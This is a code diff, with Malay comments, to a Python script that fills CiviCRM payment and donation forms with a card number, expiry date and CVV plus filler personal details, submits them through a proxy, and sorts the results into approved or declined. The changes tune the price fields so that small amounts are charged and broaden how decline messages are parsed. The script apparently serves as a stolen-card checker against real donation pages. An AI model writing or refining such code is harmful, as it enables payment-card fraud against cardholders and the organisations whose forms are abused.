@@ -228,21 +228,31 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    status_div = soup.find('div', class_='status')
-    if not status_div:
-        status_div = soup.find('div', class_=re.compile(r'alert|error', re.I))
-        
-    if status_div:
-        error_items = status_div.find_all('li')
-        if error_items:
-            errors = [item.get_text(strip=True) for item in error_items]
-            error_message = " | ".join(errors)
-            return {'approved': False, 'has_msg': True, 'message': f'Form Error: {error_message}', 'clean_response': error_message}
-        else:
-            error_text = status_div.get_text(strip=True)
-            error_text = re.sub(r'\s+', ' ', error_text).strip()
-            if error_text and len(error_text) > 3:
-                return {'approved': False, 'has_msg': True, 'message': f'Status: {error_text}', 'clean_response': error_text}
+    # Cari semua div status atau alert
+    status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages', re.I))
+    for status_div in status_divs:
+        error_text = status_div.get_text(separator=' ', strip=True)
+        error_text = re.sub(r'\s+', ' ', error_text).strip()
+        if error_text and len(error_text) > 3:
+            # Buang ayat generic CiviCRM yang tak penting
+            if "Please correct the following errors in the form fields below:" in error_text:
+                error_text = error_text.replace("Please correct the following errors in the form fields below:", "").strip()
+            if error_text:
+                return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
+                
+    # Cari span class msg-text
+    msg_text_span = soup.find('span', class_='msg-text')
+    if msg_text_span:
+        error_text = msg_text_span.get_text(strip=True)
+        if "Payment Processor Error message:" in error_text: error_text = error_text.split("Payment Processor Error message:")[-1].strip()
+        if "Payment Response:" in error_text: error_text = error_text.split("Payment Response:")[-1].strip()
+        error_text = re.sub(r'\s+', ' ', error_text).strip()
+        if error_text and len(error_text) > 3:
+            return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
+            
+    # Cari ayat declined secara umum
+    if 'decline' in soup.get_text(' ', strip=True).lower():
+        return {'approved': False, 'has_msg': True, 'message': 'Transaction Declined', 'clean_response': 'Transaction Declined'}
 
     if '_qf_ThankYou_display=true' in url or '_qf_ThankYou_display=1' in url:
         return {'approved': True, 'has_msg': False, 'message': 'Payment complete', 'clean_response': 'Payment complete'}
@@ -341,27 +351,32 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
 
         if 'stripe' in key_lower or 'token' in key_lower or 'paypal' in key_lower: continue
         if field_type in ['submit', 'button', 'image']: continue
-        if current_value in ['null', None]: continue
+
+        # FIX 1: Untuk price_2, biarkan value asal dari HTML (jangan tukar 25.00)
+        if 'price' in key_lower or 'amount' in key_lower:
+            if not price_selected:
+                # Kalau value asal dia kosong, kita letak 10.00
+                final_payload[key] = current_value if current_value else "10.00"
+                price_selected = True
+            else:
+                final_payload[key] = '0'
+            continue
+
+        # FIX 2: Untuk custom_1, custom_2, biarkan value asal dari HTML
+        if 'custom_' in key_lower or 'selectProduct' in key_lower:
+            final_payload[key] = current_value
+            continue
+
+        # FIX 3: Hidden processor biarkan value asal
+        if 'hidden_processor' in key_lower:
+            final_payload[key] = current_value if current_value else "1"
+            continue
 
         if field_type == 'radio' or field_type == 'checkbox':
-            if 'price' in key_lower or 'amount' in key_lower:
-                if not price_selected:
-                    try:
-                        val_float = float(current_value) if current_value else 0.0
-                        if val_float > 10.0:
-                            final_payload[key] = '0'
-                        else:
-                            final_payload[key] = "25.00"
-                            price_selected = True
-                    except:
-                        final_payload[key] = "25.00"
-                        price_selected = True
-                else:
-                    final_payload[key] = '0'
-            else:
-                if 'organization' in key_lower: final_payload[key] = ''
-                elif 'recurring' in key_lower or 'recur' in key_lower: final_payload[key] = '0'
-                else: final_payload[key] = current_value
+            if 'recurring' in key_lower or 'recur' in key_lower: 
+                final_payload[key] = '0'
+            else: 
+                final_payload[key] = current_value
             continue
 
         if field_type == 'select':
@@ -370,22 +385,9 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
             elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
             elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
             elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
-            elif 'price' in key_lower or 'amount' in key_lower:
-                if not price_selected:
-                    try:
-                        val_float = float(current_value) if current_value else 0.0
-                        if val_float > 10.0:
-                            final_payload[key] = '0'
-                        else:
-                            final_payload[key] = "25.00"
-                            price_selected = True
-                    except:
-                        final_payload[key] = "25.00"
-                        price_selected = True
-                else:
-                    final_payload[key] = '0'
             else:
-                if options: final_payload[key] = options[0]
+                # Kalau select lain (custom), biarkan value asal
+                final_payload[key] = current_value
             continue
 
         if field_type == 'hidden':
@@ -415,20 +417,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         elif 'pass' in key_lower or 'pwd' in key_lower: final_payload[key] = user_data['password']
         elif 'user' in key_lower or 'login' in key_lower: final_payload[key] = user_data['username']
         elif 'employer' in key_lower or 'occupation' in key_lower or 'affiliation' in key_lower or 'position' in key_lower or 'profession' in key_lower: final_payload[key] = "Self Employed"
-        elif 'price' in key_lower or 'amount' in key_lower:
-            if not price_selected:
-                try:
-                    val_float = float(current_value) if current_value else 0.0
-                    if val_float > 10.0:
-                        final_payload[key] = "0"
-                    else:
-                        final_payload[key] = "25.00"
-                        price_selected = True
-                except:
-                    final_payload[key] = "25.00"
-                    price_selected = True
-            else:
-                final_payload[key] = "0"
         else:
             if not current_value:
                 continue
